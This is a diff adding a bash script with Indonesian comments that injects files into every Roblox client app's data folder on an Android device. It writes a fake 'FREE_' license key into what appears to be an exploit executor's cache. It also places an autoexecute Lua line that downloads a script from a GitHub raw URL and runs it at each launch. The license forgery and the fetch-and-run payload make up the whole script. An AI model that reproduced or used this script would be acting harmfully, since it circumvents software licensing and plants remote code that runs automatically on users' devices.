@@ -1,0 +1,50 @@
+#!/bin/bash
+
+# --- Konfigurasi ---
+BASE_DIR="/sdcard/Android/data"
+NEW_LICENSE="FREE_c29b6ebaccf0a8e1d61c44741bdec0da"
+LUA_PAYLOAD='loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/dipsinext"))()'
+
+echo "Memulai proses injeksi lisensi dan autoexecute..."
+echo "================================================="
+
+# Loop melalui semua item yang berawalan com.roblox. di dalam direktori base
+for app_dir in "$BASE_DIR"/com.roblox.*; do
+    
+    # Pastikan item tersebut adalah direktori
+    if [ -d "$app_dir" ]; then
+        APP_NAME=$(basename "$app_dir")
+        echo "Memproses: $APP_NAME"
+        
+        # --- 1. Proses License ---
+        LICENSE_FILE="$app_dir/files/gloop/external/Internals/Cache/license"
+        CACHE_DIR=$(dirname "$LICENSE_FILE")
+
+        # Buat folder Cache beserta parent-nya jika belum ada
+        if [ ! -d "$CACHE_DIR" ]; then
+            mkdir -p "$CACHE_DIR"
+            echo "  [+] Membuat struktur folder Cache yang kosong."
+        fi
+        
+        # Tulis/timpa file license
+        echo -n "$NEW_LICENSE" > "$LICENSE_FILE"
+        echo "  [+] License ditambahkan/diperbarui."
+        
+        # --- 2. Proses Autoexecute ---
+        AUTOEXEC_DIR="$app_dir/files/gloop/external/Autoexecute"
+        TARGET_FILE="$AUTOEXEC_DIR/main.txt"
+        
+        # Buat folder Autoexecute beserta parent-nya jika belum ada
+        if [ ! -d "$AUTOEXEC_DIR" ]; then
+            mkdir -p "$AUTOEXEC_DIR"
+            echo "  [+] Membuat struktur folder Autoexecute."
+        fi
+        
+        # Tulis/timpa file main.txt
+        echo "$LUA_PAYLOAD" > "$TARGET_FILE"
+        echo "  [+] Payload main.txt ditambahkan."
+        echo "-------------------------------------------------"
+    fi
+done
+
+echo "Semua proses selesai!"
